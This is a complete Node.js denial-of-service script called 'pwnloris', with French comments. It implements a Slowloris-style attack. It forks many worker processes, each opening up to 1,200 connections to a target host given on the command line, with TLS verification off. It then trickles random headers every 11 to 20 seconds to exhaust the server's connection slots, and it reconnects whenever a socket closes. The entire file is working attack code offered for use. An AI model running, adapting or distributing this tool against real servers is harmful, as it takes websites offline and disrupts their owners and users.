#!/usr/bin/env node
const cluster = require('cluster');
const net = require('net');
const tls = require('tls');

const args = process.argv.slice(2);
if (args.length === 0) {
  console.log('\x1b[31mUsage: node pwnloris-final-simple.js <host>[:port] [-c <num>] [--workers <num>] [--https]\x1b[0m');
  process.exit(1);
}

let target = args[0];
let port = 80;
let isHttps = false;
let maxConnsPerWorker = 1200;
let numWorkers = 12;

if (target.includes(':')) {
  const [h, p] = target.split(':');
  target = h;
  port = parseInt(p);
}
for (let i = 1; i < args.length; i++) {
  if (args[i] === '-c' || args[i] === '--connections') maxConnsPerWorker = parseInt(args[i+1]);
  if (args[i] === '--workers') numWorkers = parseInt(args[i+1]);
  if (args[i] === '--https') isHttps = true;
}
if (isHttps && port === 80) port = 443;

if (cluster.isPrimary) {
  console.log(`\x1b[32m[pwnloris-final-simple] ${numWorkers} workers | ${maxConnsPerWorker} conns/worker - Version la plus efficace sur 1 IP\x1b[0m\n`);
  for (let i = 0; i < numWorkers; i++) cluster.fork();

  process.on('SIGINT', () => {
    console.log('\x1b[33m[Master] Arrêt en cours...\x1b[0m');
    for (const id in cluster.workers) cluster.workers[id].kill('SIGINT');
    setTimeout(() => process.exit(0), 1500);
  });
} else {
  let openConns = 0;
  let packets = 0;
  let stopped = false;

  const createConnection = () => {
    if (stopped || openConns >= maxConnsPerWorker) return;

    const socket = isHttps ? tls.connect(port, target, { rejectUnauthorized: false }) : net.connect(port, target);

    socket.on('connect', () => {
      openConns++;
      socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nConnection: keep-alive\r\n\r\n`);

      // Trickle simple et discret
      setInterval(() => {
        if (socket.destroyed || stopped) return;
        socket.write(`X-a${Math.random().toString(36).slice(2)}: keep\r\n`);
        packets++;
      }, 11000 + Math.random() * 9000); // entre 11 et 20 secondes
    });

    socket.on('error', () => {});
    socket.on('close', () => {
      openConns = Math.max(0, openConns - 1);
      if (!stopped) setTimeout(createConnection, 10);
    });
  };

  // Lancement
  for (let i = 0; i < 300; i++) {
    setTimeout(createConnection, i * 8);
  }
  setInterval(createConnection, 700);

  setInterval(() => {
    if (stopped) return;
    console.log(`\x1b[36m[Worker ${process.pid}] Connexions: ${openConns}/${maxConnsPerWorker} | Paquets: ${packets}\x1b[0m`);
  }, 8000);

  process.on('SIGINT', () => { stopped = true; setTimeout(() => process.exit(0), 600); });
}

console.log('Ctrl+C pour arrêter');
